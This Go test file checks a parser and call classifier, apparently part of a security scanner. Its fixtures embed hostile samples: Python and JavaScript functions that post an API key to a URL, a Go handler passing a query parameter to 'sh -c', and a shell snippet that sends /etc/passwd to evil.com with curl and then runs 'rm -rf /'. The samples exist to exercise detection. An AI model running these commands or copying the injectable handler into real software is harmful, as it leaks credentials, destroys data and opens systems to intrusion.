package ir

import (
	"fmt"
	"strings"
	"testing"
)

func TestParsePython(t *testing.T) {
	code := `import os
import requests
from subprocess import Popen

def send_data(url, data):
    token = os.getenv("API_KEY")
    response = requests.post(url, json={"token": token, "data": data})
    return response.status_code

def run_command(cmd):
    os.system(cmd)
    Popen(cmd, shell=True)

result = send_data("https://evil.com", "secret")
`

	parser, ok := GetParser("python")
	if !ok {
		t.Fatal("Python parser not found")
	}

	file, err := parser.Parse("test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 验证文件基本信息
	if file.Language != "python" {
		t.Errorf("expected language python, got %s", file.Language)
	}
	if !file.IsParsed() {
		t.Error("expected file to be parsed")
	}

	// 验证函数提取
	fmt.Printf("Functions found: %d\n", len(file.Functions))
	for _, fn := range file.Functions {
		fmt.Printf("  - %s (line %d-%d), calls: %d, params: %d\n",
			fn.Name, fn.StartLine, fn.EndLine, len(fn.Calls), len(fn.Parameters))
		for _, call := range fn.Calls {
			fmt.Printf("    call: %s (line %d) category=%s\n",
				call.FuncName, call.Line, call.Category())
		}
	}

	if len(file.Functions) < 2 {
		t.Errorf("expected at least 2 functions, got %d", len(file.Functions))
	}

	// 验证 send_data 函数
	sendFn := file.FindFunction("send_data")
	if sendFn == nil {
		t.Fatal("send_data function not found")
	}
	if len(sendFn.Parameters) != 2 {
		t.Errorf("send_data should have 2 params, got %d", len(sendFn.Parameters))
	}

	// 验证 send_data 内的调用
	foundPost := false
	foundGetenv := false
	for _, call := range sendFn.Calls {
		if call.FuncName == "requests.post" {
			foundPost = true
		}
		if call.FuncName == "os.getenv" {
			foundGetenv = true
		}
	}
	if !foundPost {
		t.Error("send_data should contain requests.post call")
	}
	if !foundGetenv {
		t.Error("send_data should contain os.getenv call")
	}

	// 验证 run_command 函数的危险调用
	runFn := file.FindFunction("run_command")
	if runFn == nil {
		t.Fatal("run_command function not found")
	}
	foundSystem := false
	for _, call := range runFn.Calls {
		if call.FuncName == "os.system" {
			foundSystem = true
			if call.Category() != string(CatCommandExec) {
				t.Errorf("os.system should be command_exec, got %s", call.Category())
			}
		}
	}
	if !foundSystem {
		t.Error("run_command should contain os.system call")
	}

	// 验证导入
	fmt.Printf("\nImports found: %d\n", len(file.Imports))
	for _, imp := range file.Imports {
		fmt.Printf("  - module=%s, items=%v\n", imp.Module, imp.Items)
	}

	// 验证顶层调用
	fmt.Printf("\nTop-level calls: %d\n", len(file.TopLevelCalls))
	for _, call := range file.TopLevelCalls {
		fmt.Printf("  - %s (line %d)\n", call.FuncName, call.Line)
	}

	// 打印所有调用
	fmt.Printf("\nAll calls in file:\n")
	for _, call := range file.AllCallExprs() {
		fmt.Printf("  - %s (line %d) category=%s dangerous=%v\n",
			call.FuncName, call.Line, call.Category(), IsDangerousCall(call.FuncName))
	}
}

func TestParseGo(t *testing.T) {
	code := `package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")
	output, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	fmt.Fprintf(w, string(output))
}

func readFile(path string) string {
	data, _ := os.ReadFile(path)
	return string(data)
}
`

	parser, ok := GetParser("go")
	if !ok {
		t.Fatal("Go parser not found")
	}

	file, err := parser.Parse("main.go", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	if !file.IsParsed() {
		t.Error("expected file to be parsed")
	}

	fmt.Printf("Functions found: %d\n", len(file.Functions))
	for _, fn := range file.Functions {
		fmt.Printf("  - %s (line %d-%d), calls: %d\n",
			fn.Name, fn.StartLine, fn.EndLine, len(fn.Calls))
		for _, call := range fn.Calls {
			fmt.Printf("    call: %s (line %d) category=%s dangerous=%v\n",
				call.FuncName, call.Line, call.Category(), IsDangerousCall(call.FuncName))
		}
	}

	// 验证 handler 函数
	handlerFn := file.FindFunction("handler")
	if handlerFn == nil {
		t.Fatal("handler function not found")
	}

	foundExec := false
	for _, call := range handlerFn.Calls {
		// Go 链式调用会解析为 exec.Command(...).CombinedOutput
		if call.FuncName == "exec.Command" || call.FuncName == "Command" ||
			strings.Contains(call.FuncName, "exec.Command") {
			foundExec = true
		}
	}
	if !foundExec {
		t.Errorf("handler should contain exec.Command call, got: %v", handlerFn.Calls)
	}

	// 验证 readFile 函数
	readFn := file.FindFunction("readFile")
	if readFn == nil {
		t.Fatal("readFile function not found")
	}

	foundRead := false
	for _, call := range readFn.Calls {
		if call.FuncName == "os.ReadFile" || call.FuncName == "ReadFile" {
			foundRead = true
		}
	}
	if !foundRead {
		t.Error("readFile should contain os.ReadFile call")
	}
}

func TestParseJavaScript(t *testing.T) {
	code := `const axios = require('axios');
const { exec } = require('child_process');

function exfiltrate(url, data) {
    const secret = process.env.API_KEY;
    axios.post(url, { key: secret, payload: data });
}

function runCmd(command) {
    exec(command, (err, stdout) => {
        console.log(stdout);
    });
}
`

	parser, ok := GetParser("javascript")
	if !ok {
		t.Fatal("JavaScript parser not found")
	}

	file, err := parser.Parse("app.js", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	if !file.IsParsed() {
		t.Error("expected file to be parsed")
	}

	fmt.Printf("Functions found: %d\n", len(file.Functions))
	for _, fn := range file.Functions {
		fmt.Printf("  - %s (line %d-%d), calls: %d\n",
			fn.Name, fn.StartLine, fn.EndLine, len(fn.Calls))
		for _, call := range fn.Calls {
			fmt.Printf("    call: %s (line %d) category=%s\n",
				call.FuncName, call.Line, call.Category())
		}
	}
}

func TestCallClassification(t *testing.T) {
	tests := []struct {
		funcName string
		expected CallCategory
	}{
		{"os.system", CatCommandExec},
		{"subprocess.Popen", CatCommandExec},
		{"exec.Command", CatCommandExec},
		{"requests.post", CatNetworkAccess},
		{"http.Get", CatNetworkAccess},
		{"fetch", CatNetworkAccess},
		{"os.ReadFile", CatFileRead},
		{"writeFile", CatFileWrite},
		{"os.Getenv", CatEnvAccess},
		{"json.loads", CatSerialize},
		{"print", CatBenign},
		{"len", CatBenign},
	}

	for _, tt := range tests {
		got := CallCategory(ClassifyCall(tt.funcName))
		if got != tt.expected {
			t.Errorf("ClassifyCall(%q) = %q, want %q", tt.funcName, got, tt.expected)
		}
	}
}

func TestFallbackParser(t *testing.T) {
	// 测试没有专门解析器的语言（如 shell）
	code := `#!/bin/bash
curl https://evil.com -d "$(cat /etc/passwd)"
rm -rf /
`

	file := ParseFile("script.sh", code, "shell")

	// 应该降级到正则提取
	if file.ParseError == "" {
		t.Log("shell has no parser, should have parse error")
	}

	// 但仍然应该有原始内容
	if file.RawContent != code {
		t.Error("raw content should be preserved")
	}
}

func TestSupportedLanguages(t *testing.T) {
	langs := SupportedLanguages()
	fmt.Printf("Supported languages: %v\n", langs)

	if len(langs) < 3 {
		t.Errorf("expected at least 3 supported languages, got %d", len(langs))
	}
}
